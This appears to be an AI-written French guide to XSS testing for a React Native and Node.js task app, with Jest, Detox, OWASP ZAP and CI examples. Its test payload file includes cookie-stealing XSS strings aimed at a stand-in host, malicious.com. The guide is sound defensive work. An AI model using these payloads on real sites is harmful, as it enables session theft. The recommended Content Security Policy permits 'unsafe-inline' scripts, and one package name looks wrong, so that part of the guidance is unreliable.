Tests de sécurité :
-------------------

J'ai créé un guide complet pour mettre en place des tests XSS sur votre TaskManagerApp. Voici les étapes clés à suivre :
Étapes de mise en œuvre prioritaires :

Commencez par les tests unitaires - Implémentez d'abord les tests backend pour vos endpoints API
Installez les outils nécessaires - Jest, Supertest pour les tests, et OWASP ZAP pour les scans automatiques
Créez vos payloads de test - Utilisez les exemples fournis pour tester différents types d'attaques XSS
Intégrez dans votre CI/CD - Automatisez les tests de sécurité avec GitHub Actions

Points critiques pour votre stack React Native + Node.js :

Backend Express : Validez et échappez tous les inputs utilisateur
Base de données MySQL : Testez particulièrement les XSS stockés dans les tâches et commentaires
Frontend React Native : Vérifiez que les données utilisateur sont correctement sanitisées avant affichage

# Guide complet des tests XSS pour TaskManagerApp

## 1. Comprendre les types de XSS

### XSS Réfléchi (Reflected XSS)
- Le script malveillant est inclus dans la requête et renvoyé immédiatement dans la réponse
- Exemple : paramètres d'URL non validés

### XSS Stocké (Stored XSS)
- Le script malveillant est stocké dans la base de données
- Plus dangereux car il affecte tous les utilisateurs qui voient le contenu

### XSS basé sur le DOM
- Le script malveillant modifie le DOM côté client
- Spécifique aux applications JavaScript

## 2. Outils nécessaires

### Installation des outils de test
```bash
# Outils de base
npm install --save-dev jest supertest
npm install --save-dev selenium-webdriver
npm install --save-dev xss

# Outils spécialisés XSS
npm install --save-dev dom-purify
npm install --save-dev helmet
```

### Outils externes
- **OWASP ZAP** : Scanner automatique de vulnérabilités
- **Burp Suite Community** : Proxy d'interception
- **XSStrike** : Outil de détection XSS avancé

## 3. Tests Backend (Node.js/Express)

### Structure des tests
```
tests/
├── security/
│   ├── xss/
│   │   ├── reflected-xss.test.js
│   │   ├── stored-xss.test.js
│   │   └── dom-xss.test.js
│   └── helpers/
│       └── xss-payloads.js
```

### Payloads de test XSS
```javascript
// tests/security/helpers/xss-payloads.js
const XSS_PAYLOADS = {
  basic: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>'
  ],
  advanced: [
    '<script>fetch("/api/users").then(r=>r.json()).then(d=>console.log(d))</script>',
    '<img src=x onerror="document.location=\'http://malicious.com/steal?cookie=\'+document.cookie">',
    '<svg/onload="new Image().src=\'http://malicious.com/log?\'+document.cookie">',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>'
  ],
  contextual: {
    htmlAttribute: [
      '" onmouseover="alert(\'XSS\')" "',
      '\' onmouseover=\'alert("XSS")\' \'',
      '"><script>alert("XSS")</script>'
    ],
    url: [
      'javascript:alert("XSS")',
      'data:text/html,<script>alert("XSS")</script>',
      'vbscript:alert("XSS")'
    ],
    css: [
      'expression(alert("XSS"))',
      'url("javascript:alert(\'XSS\')")',
      '@import "javascript:alert(\'XSS\')"'
    ]
  }
};

module.exports = XSS_PAYLOADS;
```

### Tests pour XSS Réfléchi
```javascript
// tests/security/xss/reflected-xss.test.js
const request = require('supertest');
const app = require('../../../app');
const XSS_PAYLOADS = require('../helpers/xss-payloads');

describe('Reflected XSS Tests', () => {
  describe('Search functionality', () => {
    test('should sanitize search query parameters', async () => {
      for (const payload of XSS_PAYLOADS.basic) {
        const response = await request(app)
          .get('/search')
          .query({ q: payload })
          .expect(200);
        
        // Vérifier que le payload n'est pas présent dans la réponse
        expect(response.text).not.toContain('<script>');
        expect(response.text).not.toContain('javascript:');
        expect(response.text).not.toContain('onerror=');
      }
    });
  });

  describe('Error pages', () => {
    test('should sanitize error messages', async () => {
      const payload = '<script>alert("XSS")</script>';
      const response = await request(app)
        .get('/nonexistent')
        .query({ error: payload })
        .expect(404);
      
      expect(response.text).not.toContain(payload);
    });
  });

  describe('User input fields', () => {
    test('should sanitize task title input', async () => {
      for (const payload of XSS_PAYLOADS.basic) {
        const response = await request(app)
          .post('/tasks')
          .send({
            title: payload,
            description: 'Test task'
          })
          .expect(400); // Devrait rejeter
      }
    });
  });
});
```

### Tests pour XSS Stocké
```javascript
// tests/security/xss/stored-xss.test.js
const request = require('supertest');
const app = require('../../../app');
const XSS_PAYLOADS = require('../helpers/xss-payloads');

describe('Stored XSS Tests', () => {
  beforeEach(async () => {
    // Nettoyer la base de données de test
    await cleanTestDatabase();
  });

  describe('Task creation', () => {
    test('should prevent XSS in task titles', async () => {
      for (const payload of XSS_PAYLOADS.basic) {
        // Créer une tâche avec payload XSS
        const createResponse = await request(app)
          .post('/api/tasks')
          .send({
            title: payload,
            description: 'Test description'
          });

        // Récupérer la tâche
        const getResponse = await request(app)
          .get(`/api/tasks/${createResponse.body.id}`)
          .expect(200);

        // Vérifier que le payload est échappé
        expect(getResponse.text).not.toContain('<script>');
        expect(getResponse.text).not.toContain('javascript:');
      }
    });
  });

  describe('Comment system', () => {
    test('should sanitize comments', async () => {
      // Créer une tâche de test
      const task = await createTestTask();
      
      for (const payload of XSS_PAYLOADS.advanced) {
        const response = await request(app)
          .post(`/api/tasks/${task.id}/comments`)
          .send({ content: payload });

        // Vérifier que le commentaire est rejeté ou échappé
        expect(response.status).toBe(400);
      }
    });
  });
});
```

## 4. Tests Frontend (React Native)

### Configuration des tests E2E
```javascript
// e2e/xss-tests.spec.js
const { device, element, by, expect } = require('detox');

describe('XSS Prevention - Frontend', () => {
  beforeAll(async () => {
    await device.launchApp();
  });

  describe('Input validation', () => {
    it('should handle XSS in task input', async () => {
      await element(by.id('taskTitleInput')).typeText('<script>alert("XSS")</script>');
      await element(by.id('createTaskButton')).tap();
      
      // Vérifier que l'app ne crash pas et que le script n'est pas exécuté
      await expect(element(by.id('taskList'))).toBeVisible();
    });
  });

  describe('Data display', () => {
    it('should safely render user-generated content', async () => {
      // Simuler des données avec potentiel XSS depuis l'API
      const xssData = {
        title: '<img src=x onerror=alert("XSS")>',
        description: '<script>alert("XSS")</script>'
      };
      
      // Vérifier que le contenu est affiché sans exécuter de script
      await expect(element(by.text(xssData.title))).not.toBeVisible();
    });
  });
});
```

## 5. Tests automatisés avec OWASP ZAP

### Script de test ZAP
```python
# scripts/zap-xss-test.py
import time
from zapv2 import ZAPv2

def run_xss_scan():
    # Configuration ZAP
    zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
    
    # URL de votre application
    target_url = 'http://localhost:3000'
    
    print('Démarrage du scan XSS...')
    
    # Spider l'application
    zap.spider.scan(target_url)
    time.sleep(2)
    
    while int(zap.spider.status()) < 100:
        print(f'Spider progress: {zap.spider.status()}%')
        time.sleep(2)
    
    # Scan de vulnérabilités XSS
    zap.ascan.scan(target_url)
    
    while int(zap.ascan.status()) < 100:
        print(f'Scan XSS progress: {zap.ascan.status()}%')
        time.sleep(5)
    
    # Générer le rapport
    alerts = zap.core.alerts()
    xss_alerts = [alert for alert in alerts if 'Cross Site Scripting' in alert['name']]
    
    print(f'Vulnérabilités XSS trouvées: {len(xss_alerts)}')
    
    for alert in xss_alerts:
        print(f"URL: {alert['url']}")
        print(f"Paramètre: {alert['param']}")
        print(f"Evidence: {alert['evidence']}")
        print("---")

if __name__ == '__main__':
    run_xss_scan()
```

## 6. Intégration CI/CD

### GitHub Actions
```yaml
# .github/workflows/security-tests.yml
name: Security Tests

on: [push, pull_request]

jobs:
  xss-tests:
    runs-on: ubuntu-latest
    
    services:
      mysql:
        image: mysql:8.0
        env:
          MYSQL_ROOT_PASSWORD: test
          MYSQL_DATABASE: taskmanager_test
        options: >-
          --health-cmd="mysqladmin ping"
          --health-interval=10s
          --health-timeout=5s
          --health-retries=3

    steps:
    - uses: actions/checkout@v2
    
    - name: Setup Node.js
      uses: actions/setup-node@v2
      with:
        node-version: '16'
    
    - name: Install dependencies
      run: npm ci
    
    - name: Run XSS tests
      run: npm run test:xss
      env:
        NODE_ENV: test
        DB_HOST: localhost
        DB_USER: root
        DB_PASS: test
        DB_NAME: taskmanager_test
    
    - name: Run OWASP ZAP scan
      run: |
        docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-baseline.py \
          -t http://localhost:3000 -J zap-report.json
    
    - name: Upload security report
      uses: actions/upload-artifact@v2
      with:
        name: security-report
        path: zap-report.json
```

## 7. Mesures de protection recommandées

### Configuration Helmet.js
```javascript
// middleware/security.js
const helmet = require('helmet');

module.exports = helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
  crossOriginEmbedderPolicy: false
});
```

### Validation et échappement
```javascript
// utils/sanitize.js
const DOMPurify = require('isomorphic-dompurify');
const validator = require('validator');

function sanitizeInput(input) {
  if (typeof input !== 'string') return input;
  
  // Échapper les caractères HTML
  return validator.escape(input);
}

function sanitizeHTML(html) {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: []
  });
}

module.exports = { sanitizeInput, sanitizeHTML };
```

## 8. Commandes de test

### Scripts package.json
```json
{
  "scripts": {
    "test:xss": "jest tests/security/xss/",
    "test:xss:watch": "jest tests/security/xss/ --watch",
    "test:security": "jest tests/security/",
    "scan:zap": "python3 scripts/zap-xss-test.py",
    "test:e2e:xss": "detox test e2e/xss-tests.spec.js"
  }
}
```

### Exécution des tests
```bash
# Tests unitaires XSS
npm run test:xss

# Tests de sécurité complets
npm run test:security

# Scan automatique OWASP ZAP
npm run scan:zap

# Tests E2E pour XSS
npm run test:e2e:xss
```

## 9. Rapport et monitoring

### Génération de rapports
```javascript
// scripts/generate-security-report.js
const fs = require('fs');
const path = require('path');

function generateSecurityReport(testResults) {
  const report = {
    timestamp: new Date().toISOString(),
    summary: {
      total_tests: testResults.numTotalTests,
      passed: testResults.numPassedTests,
      failed: testResults.numFailedTests,
      xss_vulnerabilities: testResults.xssVulnerabilities || 0
    },
    details: testResults.testResults
  };

  const reportPath = path.join(__dirname, '../reports/security-report.json');
  fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
  
  console.log(`Rapport de sécurité généré: ${reportPath}`);
}

module.exports = generateSecurityReport;
```

## 10. Checklist de sécurité XSS

### Validation côté serveur
- [ ] Tous les inputs utilisateur sont validés
- [ ] Caractères spéciaux échappés dans les réponses HTML
- [ ] Headers de sécurité configurés (CSP, X-XSS-Protection)
- [ ] Validation des types de contenu

### Validation côté client
- [ ] Sanitisation des données avant affichage
- [ ] Validation des URLs avant navigation
- [ ] Contrôle des événements DOM

### Tests automatisés
- [ ] Tests unitaires pour tous les points d'entrée
- [ ] Tests d'intégration avec payloads XSS
- [ ] Scan automatique dans la CI/CD
- [ ] Tests E2E avec simulation d'attaques

### Monitoring
- [ ] Logs des tentatives XSS
- [ ] Alertes en cas de détection
- [ ] Rapports de sécurité réguliers
- [ ] Mise à jour des signatures d'attaque

Ce guide vous donne une base solide pour implémenter des tests XSS complets sur votre TaskManagerApp. Commencez par les tests unitaires de base, puis étendez progressivement vers les tests automatisés et l'intégration CI/CD.